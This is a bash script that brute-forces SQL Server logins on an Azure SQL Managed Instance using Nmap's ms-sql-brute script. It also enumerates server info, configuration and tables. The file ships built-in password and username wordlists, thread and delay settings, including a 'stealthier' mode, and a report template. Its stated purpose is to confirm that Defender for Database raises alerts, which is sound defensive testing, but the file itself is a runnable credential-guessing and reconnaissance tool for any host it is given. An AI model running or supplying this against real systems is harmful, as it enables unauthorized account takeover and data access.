#!/bin/bash

# SQL Managed Instance Brute Force Testing Script
# This script tests brute force attacks against SQL MI to validate Defender for Database protection

set -e

# Configuration
SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
LOG_DIR="$SCRIPT_DIR/logs"
WORDLIST_DIR="$SCRIPT_DIR/wordlists"
RESULTS_DIR="$SCRIPT_DIR/results"

# Colors for output
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
NC='\033[0m' # No Color

# Default values
DEFAULT_PORT="1433"
DEFAULT_THREADS="10"
DEFAULT_DELAY="1"

# Function to print colored output
print_status() {
    echo -e "${BLUE}[INFO]${NC} $1"
}

print_success() {
    echo -e "${GREEN}[SUCCESS]${NC} $1"
}

print_warning() {
    echo -e "${YELLOW}[WARNING]${NC} $1"
}

print_error() {
    echo -e "${RED}[ERROR]${NC} $1"
}

# Function to show usage
show_usage() {
    cat << EOF
Usage: $0 [OPTIONS]

This script performs brute force attacks against SQL Managed Instance using Nmap NSE scripts
to test Defender for Database protection.

OPTIONS:
    -h, --host HOSTNAME         SQL MI hostname or FQDN (required)
    -p, --port PORT            SQL Server port (default: $DEFAULT_PORT)
    -u, --username USERNAME    Target username (default: uses wordlist)
    -t, --threads THREADS      Number of threads (default: $DEFAULT_THREADS)
    -d, --delay SECONDS        Delay between attempts (default: $DEFAULT_DELAY)
    -w, --wordlist TYPE        Wordlist type: small|medium|large (default: small)
    -v, --verbose              Verbose output
    --help                     Show this help message

EXAMPLES:
    # Basic brute force test
    $0 --host sqlmi-d4sqlsim-abc123.database.windows.net

    # Test specific username with custom wordlist
    $0 --host sqlmi-d4sqlsim-abc123.database.windows.net --username d4sqlsim --wordlist medium

    # Slower, stealthier test
    $0 --host sqlmi-d4sqlsim-abc123.database.windows.net --threads 5 --delay 2

NOTES:
    - This script is for testing Defender for Database protection
    - Ensure you have proper authorization before running
    - Monitor Azure Security Center for alerts during testing
    - Results are saved to $RESULTS_DIR directory

EOF
}

# Function to check dependencies
check_dependencies() {
    print_status "Checking dependencies..."
    
    if ! command -v nmap &> /dev/null; then
        print_error "Nmap is not installed. Please install it first."
        print_status "On macOS: brew install nmap"
        print_status "On Ubuntu/Debian: sudo apt-get install nmap"
        exit 1
    fi
    
    # Check if NSE scripts are available
    if ! nmap --script-help ms-sql-brute &> /dev/null; then
        print_error "Nmap NSE scripts for SQL Server are not available."
        exit 1
    fi
    
    print_success "Dependencies check passed"
}

# Function to create directories
setup_directories() {
    mkdir -p "$LOG_DIR" "$WORDLIST_DIR" "$RESULTS_DIR"
}

# Function to create wordlists
create_wordlists() {
    print_status "Creating wordlists..."
    
    # Small wordlist - common passwords
    cat > "$WORDLIST_DIR/passwords_small.txt" << 'EOF'
password
123456
password123
admin
letmein
welcome
qwerty
abc123
Password1
password1
admin123
root
toor
pass
test
guest
user
SQL
sqlserver
sa
Password123
123456789
password!
Password!
admin!
EOF

    # Medium wordlist - includes common SQL Server passwords
    cat > "$WORDLIST_DIR/passwords_medium.txt" << 'EOF'
password
123456
password123
admin
letmein
welcome
qwerty
abc123
Password1
password1
admin123
root
toor
pass
test
guest
user
SQL
sqlserver
sa
Password123
123456789
password!
Password!
admin!
SQLServer
SqlServer
sql123
SQL123
server
database
db
master
msdb
tempdb
model
sysadmin
dbowner
public
dbo
sa123
sadmin
sqladmin
SQLAdmin
Password@123
password@123
Admin123
Welcome123
Test123
Demo123
Temp123
Passw0rd
P@ssw0rd
P@ssword1
P@ssw0rd1
Secret123
secret
Secret
company123
Company123
azure123
Azure123
microsoft
Microsoft
windows
Windows
2023
2024
2025
january
february
march
april
may
june
july
august
september
october
november
december
spring
summer
autumn
winter
monday
tuesday
wednesday
thursday
friday
saturday
sunday
EOF

    # Large wordlist - comprehensive password list
    cat "$WORDLIST_DIR/passwords_medium.txt" > "$WORDLIST_DIR/passwords_large.txt"
    cat >> "$WORDLIST_DIR/passwords_large.txt" << 'EOF'
123123
321321
111111
000000
555555
777777
888888
999999
123321
654321
1234567
12345678
1234567890
qwertyuiop
asdfghjkl
zxcvbnm
qwerty123
asdf1234
zxcv1234
football
basketball
baseball
soccer
tennis
golf
hockey
swimming
running
cycling
mustang
ferrari
lamborghini
mercedes
bmw
audi
toyota
honda
nissan
ford
chevrolet
dodge
apple
banana
orange
grape
strawberry
blueberry
raspberry
pineapple
watermelon
cantaloupe
sunshine
rainbow
butterfly
elephant
giraffe
penguin
dolphin
eagle
tiger
lion
bear
wolf
shark
whale
dragon
phoenix
unicorn
wizard
magic
castle
princess
prince
knight
warrior
archer
mage
rogue
paladin
barbarian
shaman
druid
ranger
monk
bard
cleric
warlock
sorcerer
necromancer
EOF

    # Common usernames
    cat > "$WORDLIST_DIR/usernames.txt" << 'EOF'
sa
admin
administrator
root
user
guest
test
demo
temp
public
dbo
owner
manager
operator
developer
analyst
consultant
specialist
coordinator
supervisor
director
executive
president
ceo
cfo
cto
cio
hr
finance
sales
marketing
support
service
backup
monitoring
reporting
audit
security
compliance
d4sqlsim
sqluser
dbuser
dbadmin
sqladmin
sysadmin
dbowner
dataowner
appuser
webuser
apiuser
serviceuser
testuser
devuser
produser
staginguser
EOF

    print_success "Wordlists created in $WORDLIST_DIR"
}

# Function to perform brute force attack
run_brute_force() {
    local host="$1"
    local port="$2"
    local username="$3"
    local threads="$4"
    local delay="$5"
    local wordlist_type="$6"
    local verbose="$7"
    
    local timestamp=$(date +"%Y%m%d_%H%M%S")
    local result_file="$RESULTS_DIR/brute_force_${timestamp}.txt"
    local log_file="$LOG_DIR/brute_force_${timestamp}.log"
    
    print_status "Starting brute force attack against $host:$port"
    print_status "Results will be saved to: $result_file"
    print_status "Logs will be saved to: $log_file"
    
    # Build nmap command
    local nmap_cmd="nmap -p $port --script ms-sql-brute"
    
    # Add script arguments
    local script_args=""
    
    # Add username if specified
    if [[ -n "$username" ]]; then
        script_args="$script_args,userdb=string:$username"
    else
        script_args="$script_args,userdb=$WORDLIST_DIR/usernames.txt"
    fi
    
    # Add password wordlist
    script_args="$script_args,passdb=$WORDLIST_DIR/passwords_${wordlist_type}.txt"
    
    # Add thread count
    script_args="$script_args,brute.threads=$threads"
    
    # Add delay
    script_args="$script_args,brute.delay=${delay}s"
    
    # Remove leading comma
    script_args="${script_args#,}"
    
    # Add script arguments to command
    nmap_cmd="$nmap_cmd --script-args=\"$script_args\""
    
    # Add verbose flag if specified
    if [[ "$verbose" == "true" ]]; then
        nmap_cmd="$nmap_cmd -v"
    fi
    
    # Add target
    nmap_cmd="$nmap_cmd $host"
    
    print_status "Executing: $nmap_cmd"
    
    # Run the attack and save results
    {
        echo "=== SQL Managed Instance Brute Force Test ==="
        echo "Target: $host:$port"
        echo "Username: ${username:-'wordlist'}"
        echo "Wordlist: $wordlist_type"
        echo "Threads: $threads"
        echo "Delay: ${delay}s"
        echo "Timestamp: $(date)"
        echo "============================================="
        echo ""
        
        eval "$nmap_cmd" 2>&1
        
    } | tee "$result_file" | tee "$log_file"
    
    print_success "Brute force attack completed"
    print_status "Check the results in: $result_file"
}

# Function to run additional enumeration
run_enumeration() {
    local host="$1"
    local port="$2"
    local verbose="$3"
    
    local timestamp=$(date +"%Y%m%d_%H%M%S")
    local enum_file="$RESULTS_DIR/enumeration_${timestamp}.txt"
    
    print_status "Running SQL Server enumeration..."
    
    local nmap_cmd="nmap -p $port --script ms-sql-info,ms-sql-config,ms-sql-tables,ms-sql-hasdbaccess"
    
    if [[ "$verbose" == "true" ]]; then
        nmap_cmd="$nmap_cmd -v"
    fi
    
    nmap_cmd="$nmap_cmd $host"
    
    {
        echo "=== SQL Server Enumeration ==="
        echo "Target: $host:$port"
        echo "Timestamp: $(date)"
        echo "=============================="
        echo ""
        
        eval "$nmap_cmd" 2>&1
        
    } | tee "$enum_file"
    
    print_success "Enumeration completed: $enum_file"
}

# Function to generate test report
generate_report() {
    local host="$1"
    local report_file="$RESULTS_DIR/test_report_$(date +"%Y%m%d_%H%M%S").md"
    
    cat > "$report_file" << EOF
# SQL Managed Instance Security Test Report

## Test Overview
- **Target**: $host
- **Test Date**: $(date)
- **Test Purpose**: Validate Defender for Database protection against brute force attacks

## Test Methodology
1. **Brute Force Attack**: Used Nmap NSE scripts to attempt password guessing
2. **Service Enumeration**: Attempted to gather SQL Server information
3. **Detection Validation**: Monitor Azure Security Center for alerts

## Expected Results
- **Defender for Database** should detect and alert on:
  - Brute force login attempts
  - Suspicious authentication patterns
  - Multiple failed login attempts
  - Service enumeration attempts

## Files Generated
- Results: \`$RESULTS_DIR/\`
- Logs: \`$LOG_DIR/\`

## Next Steps
1. Check Azure Security Center for alerts
2. Review Log Analytics workspace for security events
3. Validate Defender for Database recommendations
4. Review SQL MI audit logs

## Security Recommendations
- Monitor for repeated failed login attempts
- Implement strong password policies
- Use Azure AD authentication when possible
- Enable advanced threat protection
- Set up automated responses to security alerts

---
*Generated by SQL MI Security Testing Script*
EOF

    print_success "Test report generated: $report_file"
}

# Main function
main() {
    local host=""
    local port="$DEFAULT_PORT"
    local username=""
    local threads="$DEFAULT_THREADS"
    local delay="$DEFAULT_DELAY"
    local wordlist_type="small"
    local verbose="false"
    
    # Parse command line arguments
    while [[ $# -gt 0 ]]; do
        case $1 in
            -h|--host)
                host="$2"
                shift 2
                ;;
            -p|--port)
                port="$2"
                shift 2
                ;;
            -u|--username)
                username="$2"
                shift 2
                ;;
            -t|--threads)
                threads="$2"
                shift 2
                ;;
            -d|--delay)
                delay="$2"
                shift 2
                ;;
            -w|--wordlist)
                wordlist_type="$2"
                shift 2
                ;;
            -v|--verbose)
                verbose="true"
                shift
                ;;
            --help)
                show_usage
                exit 0
                ;;
            *)
                print_error "Unknown option: $1"
                show_usage
                exit 1
                ;;
        esac
    done
    
    # Validate required parameters
    if [[ -z "$host" ]]; then
        print_error "Host is required. Use --host to specify the SQL MI hostname."
        show_usage
        exit 1
    fi
    
    # Validate wordlist type
    if [[ ! "$wordlist_type" =~ ^(small|medium|large)$ ]]; then
        print_error "Invalid wordlist type. Use: small, medium, or large"
        exit 1
    fi
    
    print_status "=== SQL Managed Instance Brute Force Testing ==="
    print_status "Target: $host:$port"
    print_status "Threads: $threads, Delay: ${delay}s, Wordlist: $wordlist_type"
    print_warning "This test is for authorized security testing only!"
    print_warning "Monitor Azure Security Center for Defender for Database alerts"
    echo ""
    
    # Setup
    check_dependencies
    setup_directories
    create_wordlists
    
    # Run tests
    run_enumeration "$host" "$port" "$verbose"
    run_brute_force "$host" "$port" "$username" "$threads" "$delay" "$wordlist_type" "$verbose"
    
    # Generate report
    generate_report "$host"
    
    print_success "Testing completed!"
    print_status "Check Azure Security Center for Defender for Database alerts"
    print_status "Review results in: $RESULTS_DIR"
}

# Run main function with all arguments
main "$@"
